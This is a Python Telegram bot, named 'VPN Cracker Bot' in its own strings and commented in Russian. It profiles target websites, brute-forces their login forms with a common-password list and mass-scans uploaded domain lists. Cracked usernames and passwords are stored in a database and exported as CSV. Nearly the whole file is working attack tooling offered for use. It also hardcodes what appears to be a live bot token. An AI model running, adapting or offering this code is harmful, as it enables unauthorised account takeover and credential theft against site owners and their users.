import os
import asyncio
import logging
import json
import sqlite3
import random
import re
import socket
import ssl
from datetime import datetime
from urllib.parse import urlparse

import aiohttp
import aiofiles
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from fake_useragent import UserAgent
import cloudscraper
import dns.resolver
import whois
from cryptography.fernet import Fernet

# ============ КОНФИГУРАЦИЯ ============
BOT_TOKEN = os.getenv("BOT_TOKEN", "8720885527:AAFAPOYXlaIjN-iaeIDQe8VN3fkiFpvZ3b8")
ADMIN_IDS = [int(os.getenv("ADMIN_ID", 0))]

# Генерация ключа шифрования для данных
KEY = Fernet.generate_key()
cipher = Fernet(KEY)

# ============ НАСТРОЙКА БОТА ============
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ БАЗА ДАННЫХ ============
conn = sqlite3.connect("vpn_targets.db", check_same_thread=False)
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS targets (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    domain TEXT UNIQUE,
    url TEXT,
    cms TEXT,
    has_2fa INTEGER DEFAULT 0,
    has_captcha INTEGER DEFAULT 0,
    vulnerable INTEGER DEFAULT 0,
    vuln_type TEXT,
    ip TEXT,
    registrar TEXT,
    checked_at TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_id INTEGER,
    username TEXT,
    password TEXT,
    email TEXT,
    cookie TEXT,
    session_data TEXT,
    method TEXT,
    found_at TEXT,
    active INTEGER DEFAULT 1,
    FOREIGN KEY(target_id) REFERENCES targets(id)
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS scan_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    target_domain TEXT,
    action TEXT,
    result TEXT,
    timestamp TEXT
)
""")
conn.commit()

# ============ ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ============
ua = UserAgent()
scraper = cloudscraper.create_scraper()

def encrypt_data(data: str) -> str:
    return cipher.encrypt(data.encode()).decode()

def decrypt_data(data: str) -> str:
    return cipher.decrypt(data.encode()).decode()

def log_action(domain: str, action: str, result: str):
    cursor.execute(
        "INSERT INTO scan_logs (target_domain, action, result, timestamp) VALUES (?, ?, ?, ?)",
        (domain, action, result, datetime.now().isoformat())
    )
    conn.commit()

# ============ ФУНКЦИИ СКАНИРОВАНИЯ ============
async def scan_domain(domain: str) -> dict:
    """Полное сканирование домена"""
    result = {
        'domain': domain,
        'url': f"https://{domain}",
        'cms': 'unknown',
        'has_2fa': False,
        'has_captcha': False,
        'vulnerable': False,
        'vuln_type': None,
        'ip': None,
        'registrar': None,
        'errors': []
    }
    
    try:
        # WHOIS
        try:
            w = whois.whois(domain)
            result['registrar'] = w.registrar
        except Exception as e:
            result['errors'].append(f"whois: {e}")
        
        # DNS A-запись
        try:
            answers = dns.resolver.resolve(domain, 'A')
            result['ip'] = str(answers[0])
        except Exception as e:
            result['errors'].append(f"dns: {e}")
        
        # SSL-сертификат
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((domain, 443), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                    cert = ssock.getpeercert()
                    result['ssl_valid'] = True if cert else False
        except Exception as e:
            result['errors'].append(f"ssl: {e}")
        
        # HTTP-анализ
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://{domain}",
                    headers={'User-Agent': ua.random},
                    timeout=15
                ) as resp:
                    html = await resp.text()
                    
                    # Определение CMS
                    cms_patterns = {
                        'WordPress': r'wp-content|wp-includes|wordpress',
                        'WHMCS': r'whmcs|clientarea|cart\.php',
                        'Laravel': r'laravel_session|_token',
                        'Drupal': r'Drupal|sites/default',
                        'Joomla': r'joomla|com_content',
                        'Bitrix': r'bitrix|BX_',
                    }
                    for cms, pattern in cms_patterns.items():
                        if re.search(pattern, html, re.I):
                            result['cms'] = cms
                            break
                    
                    # Капча
                    captcha_patterns = ['captcha', 'recaptcha', 'hcaptcha', 'g-recaptcha', 'cf-challenge']
                    for pattern in captcha_patterns:
                        if re.search(pattern, html, re.I):
                            result['has_captcha'] = True
                            break
                    
                    # 2FA
                    twofa_patterns = ['2fa', 'two-factor', 'google-authenticator', 'totp', 'two step']
                    for pattern in twofa_patterns:
                        if re.search(pattern, html, re.I):
                            result['has_2fa'] = True
                            break
                    
                    # Уязвимости
                    vuln_patterns = {
                        'sqli': r'error.*sql|mysql|you have an error in your sql|SQL syntax',
                        'xss': r'<script>.*alert|onerror=|onload=',
                        'lfi': r'\.\./|file_get_contents|include_path',
                    }
                    for vuln_type, pattern in vuln_patterns.items():
                        if re.search(pattern, html, re.I):
                            result['vulnerable'] = True
                            result['vuln_type'] = vuln_type
                            break
                    
                    # Поиск форм логина
                    login_forms = re.findall(r'<form[^>]*action=["\'](login|signin|auth|clientarea)\.*', html, re.I)
                    result['login_forms'] = len(login_forms)
                    
        except Exception as e:
            result['errors'].append(f"http: {e}")
    
    except Exception as e:
        result['errors'].append(f"general: {e}")
    
    return result

async def brute_force(domain: str, wordlist: list = None) -> list:
    """Брутфорс логина"""
    if not wordlist:
        wordlist = ['admin', 'password', '123456', 'qwerty', 'letmein', 'admin123', 'root', 'user', 'test']
    
    found = []
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"https://{domain}",
                headers={'User-Agent': ua.random},
                timeout=10
            ) as resp:
                html = await resp.text()
                
                # Ищем форму
                form_action = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', html)
                if not form_action:
                    return found
                
                action = form_action.group(1)
                if not action.startswith('http'):
                    action = f"https://{domain}{action if action.startswith('/') else '/' + action}"
                
                # Проверяем поля формы
                username_field = re.search(r'name=["\'](username|login|email|user)["\']', html, re.I)
                password_field = re.search(r'name=["\'](password|pass|pwd)["\']', html, re.I)
                
                if not username_field or not password_field:
                    return found
                
                username_name = username_field.group(1)
                password_name = password_field.group(1)
                
                for username in wordlist[:5]:
                    for password in wordlist[:5]:
                        try:
                            data = {username_name: username, password_name: password}
                            async with session.post(
                                action,
                                data=data,
                                headers={'User-Agent': ua.random},
                                timeout=5,
                                allow_redirects=False
                            ) as resp2:
                                if resp2.status in [302, 301] or 'dashboard' in str(resp2.url).lower():
                                    found.append({
                                        'username': username,
                                        'password': password,
                                        'method': 'bruteforce'
                                    })
                                    break
                        except:
                            continue
                    if found:
                        break
    
    except Exception as e:
        logger.error(f"Bruteforce error: {e}")
    
    return found

# ============ КОМАНДЫ БОТА ============
class ScannerStates(StatesGroup):
    waiting_for_domain_list = State()

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("⛔ Доступ запрещён.")
        return
    
    await message.answer(
        "🔥 **VPN Cracker Bot**\n\n"
        "📋 Команды:\n"
        "/scan <domain> - сканировать цель\n"
        "/brute <domain> - брутфорс логина\n"
        "/mass - загрузить список доменов\n"
        "/status - статус базы\n"
        "/export - выгрузить аккаунты\n"
        "/clear - очистить базу\n"
        "/health - проверить состояние\n\n"
        "✅ Бот готов к работе.",
        parse_mode="Markdown"
    )

@dp.message(Command("scan"))
async def scan_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("❌ Укажи домен: /scan example.com")
        return
    
    domain = parts[1].strip()
    status_msg = await message.answer(f"🔍 Сканирую {domain}...")
    
    result = await scan_domain(domain)
    
    cursor.execute("""
        INSERT OR REPLACE INTO targets (domain, url, cms, has_2fa, has_captcha, vulnerable, vuln_type, ip, registrar, checked_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        domain,
        result['url'],
        result.get('cms', 'unknown'),
        1 if result.get('has_2fa') else 0,
        1 if result.get('has_captcha') else 0,
        1 if result.get('vulnerable') else 0,
        result.get('vuln_type'),
        result.get('ip'),
        result.get('registrar'),
        datetime.now().isoformat()
    ))
    conn.commit()
    
    log_action(domain, "scan", "completed")
    
    report = f"""
📊 **Результаты сканирования {domain}**

🌐 URL: {result['url']}
📦 CMS: {result.get('cms', 'Unknown')}
🛡️ 2FA: {'✅' if result.get('has_2fa') else '❌'}
🤖 Капча: {'✅' if result.get('has_captcha') else '❌'}
🔓 Уязвимости: {'⚠️ ' + result.get('vuln_type', '') if result.get('vulnerable') else '✅ Нет'}
📝 Форм входа: {result.get('login_forms', 0)}
📧 WHOIS: {result.get('registrar', 'Неизвестно')}
🖥️ IP: {result.get('ip', 'Неизвестно')}
{'⚠️ Ошибки: ' + '; '.join(result.get('errors', [])) if result.get('errors') else ''}
    """
    
    await status_msg.edit_text(report, parse_mode="Markdown")

@dp.message(Command("brute"))
async def brute_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        await message.answer("❌ Укажи домен: /brute example.com")
        return
    
    domain = parts[1].strip()
    status_msg = await message.answer(f"🔓 Брутфорс {domain}... (может занять время)")
    
    results = await brute_force(domain)
    
    if results:
        target_id = cursor.execute("SELECT id FROM targets WHERE domain=?", (domain,)).fetchone()
        if target_id:
            target_id = target_id[0]
        else:
            cursor.execute("INSERT INTO targets (domain, url, checked_at) VALUES (?, ?, ?)",
                          (domain, f"https://{domain}", datetime.now().isoformat()))
            target_id = cursor.lastrowid
        
        for cred in results:
            cursor.execute("""
                INSERT INTO credentials (target_id, username, password, method, found_at)
                VALUES (?, ?, ?, ?, ?)
            """, (target_id, cred['username'], cred['password'], cred['method'], datetime.now().isoformat()))
        conn.commit()
        
        report = f"✅ Найдено {len(results)} аккаунтов:\n\n"
        for cred in results:
            report += f"👤 {cred['username']} : {cred['password']}\n"
        
        await status_msg.edit_text(report)
    else:
        await status_msg.edit_text(f"❌ Ничего не найдено для {domain}")

@dp.message(Command("mass"))
async def mass_scan_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    await message.answer("📤 Отправь файл со списком доменов (по одному на строку)")
    await message.state.set_state(ScannerStates.waiting_for_domain_list)

@dp.message(ScannerStates.waiting_for_domain_list)
async def process_domain_list(message: types.Message, state: FSMContext):
    if not message.document:
        await message.answer("❌ Отправь файл")
        return
    
    if not message.document.file_name.endswith('.txt'):
        await message.answer("❌ Отправь .txt файл")
        return
    
    file = await bot.get_file(message.document.file_id)
    file_path = await bot.download_file(file.file_path, "domains.txt")
    
    with open("domains.txt", "r") as f:
        domains = [line.strip() for line in f if line.strip()]
    
    await state.clear()
    status_msg = await message.answer(f"🚀 Массовое сканирование {len(domains)} доменов...")
    
    results = []
    for i, domain in enumerate(domains):
        result = await scan_domain(domain)
        results.append(result)
        if (i + 1) % 5 == 0:
            await status_msg.edit_text(f"📊 Прогресс: {i+1}/{len(domains)}")
    
    # Сохраняем
    for result in results:
        cursor.execute("""
            INSERT OR REPLACE INTO targets (domain, url, cms, has_2fa, has_captcha, vulnerable, vuln_type, ip, registrar, checked_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            result['domain'],
            result['url'],
            result.get('cms', 'unknown'),
            1 if result.get('has_2fa') else 0,
            1 if result.get('has_captcha') else 0,
            1 if result.get('vulnerable') else 0,
            result.get('vuln_type'),
            result.get('ip'),
            result.get('registrar'),
            datetime.now().isoformat()
        ))
        conn.commit()
    
    stats = {
        'total': len(results),
        'vulnerable': sum(1 for r in results if r.get('vulnerable')),
        'with_2fa': sum(1 for r in results if r.get('has_2fa')),
        'wordpress': sum(1 for r in results if r.get('cms') == 'WordPress'),
        'whmcs': sum(1 for r in results if r.get('cms') == 'WHMCS')
    }
    
    await status_msg.edit_text(
        f"📊 **Итоги массового сканирования**\n\n"
        f"🎯 Всего: {stats['total']}\n"
        f"🔓 Уязвимых: {stats['vulnerable']}\n"
        f"🛡️ С 2FA: {stats['with_2fa']}\n"
        f"📦 WordPress: {stats['wordpress']}\n"
        f"💳 WHMCS: {stats['whmcs']}",
        parse_mode="Markdown"
    )

@dp.message(Command("status"))
async def status_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    targets = cursor.execute("SELECT COUNT(*) FROM targets").fetchone()[0]
    creds = cursor.execute("SELECT COUNT(*) FROM credentials").fetchone()[0]
    vulnerable = cursor.execute("SELECT COUNT(*) FROM targets WHERE vulnerable=1").fetchone()[0]
    
    await message.answer(
        f"📊 **Статус**\n\n"
        f"🎯 Целей: {targets}\n"
        f"🔑 Аккаунтов: {creds}\n"
        f"🔓 Уязвимых: {vulnerable}\n"
        f"📅 Обновлено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode="Markdown"
    )

@dp.message(Command("export"))
async def export_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    cursor.execute("""
        SELECT t.domain, c.username, c.password, c.email, c.method, c.found_at
        FROM credentials c
        JOIN targets t ON c.target_id = t.id
        WHERE c.active = 1
    """)
    data = cursor.fetchall()
    
    if not data:
        await message.answer("❌ Нет данных")
        return
    
    import csv
    with open("export.csv", "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Domain", "Username", "Password", "Email", "Method", "Found At"])
        writer.writerows(data)
    
    await message.answer_document(
        types.FSInputFile("export.csv"),
        caption=f"📦 {len(data)} аккаунтов"
    )

@dp.message(Command("clear"))
async def clear_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Да", callback_data="confirm_clear")],
        [InlineKeyboardButton(text="❌ Нет", callback_data="cancel_clear")]
    ])
    
    await message.answer("⚠️ Очистить базу?", reply_markup=keyboard)

@dp.callback_query(lambda c: c.data in ["confirm_clear", "cancel_clear"])
async def clear_callback(callback: types.CallbackQuery):
    if callback.from_user.id not in ADMIN_IDS:
        await callback.answer("Нет прав")
        return
    
    if callback.data == "confirm_clear":
        cursor.execute("DELETE FROM credentials")
        cursor.execute("DELETE FROM targets")
        conn.commit()
        await callback.message.edit_text("✅ База очищена")
    else:
        await callback.message.edit_text("❌ Отменено")
    await callback.answer()

@dp.message(Command("health"))
async def health_cmd(message: types.Message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    cursor.execute("SELECT COUNT(*) FROM targets")
    targets = cursor.fetchone()[0]
    
    await message.answer(
        f"✅ **Бот работает**\n\n"
        f"🎯 Целей: {targets}\n"
        f"📦 База: SQLite\n"
        f"🕒 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode="Markdown"
    )

# ============ ЗАПУСК ============
async def main():
    logger.info("VPN Cracker Bot запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())